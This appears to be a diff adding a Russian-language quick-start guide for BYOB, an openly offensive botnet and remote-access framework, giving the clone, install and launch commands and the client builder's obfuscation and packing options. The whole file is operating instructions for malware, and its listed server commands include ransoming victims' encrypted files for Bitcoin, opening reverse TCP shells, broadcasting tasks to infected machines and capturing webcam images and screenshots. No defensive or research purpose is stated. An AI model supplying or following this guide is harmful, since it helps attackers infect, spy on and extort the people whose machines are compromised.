@@ -1,0 +1,34 @@
+Как установить и запустить:
+Установка:
+git clone https://github.com/malwaredllc/byob.git
+cd byob
+pip install -r requirements.txt
+./setup.py
+
+Запуск:
+# ./server.py
+
+Пример: server.py [-h] [-v] [--host HOST] [--port PORT] [--database DATABASE]
+# ./client.py
+
+Пример: client.py [-h] [-v] [--name NAME] [--icon ICON] [--pastebin API] [--encrypt] [--obfuscate] [--compress] [--compile] host port [module [module ...]]
+
+Справка: help
+command <arg>                                         description                               
+ bg [id]                         background a session (default: the current session)                         
+ broadcast <command>             broadcast a task to all active sessions                                     
+ clients                         show all clients that have joined the server                               
+ debug <code>                    run python code directly on server (debugging MUST be enabled)             
+ exit                            quit the server                                                             
+ help                            show usage help for server commands                                         
+ kill <id>                       end a session                                                               
+ options                         show currently configured settings                                         
+ query <statement>               query the SQLite database                                                   
+ ransom [id]                     encrypt client files & ransom encryption key for a Bitcoin payment         
+ results [id]                    display all completed task results for a client (default: all clients)     
+ screenshot                      take a screenshot of the client desktop                                     
+ sessions                        show active client sessions                                                 
+ set <setting> [option=value]    change the value of a setting                                               
+ shell <id>                      interact with a client with a reverse TCP shell through an active session   
+ tasks [id]                      display all incomplete tasks for a client (default: all clients)           
+ webcam <mode>                   capture image/video from the webcam of a client
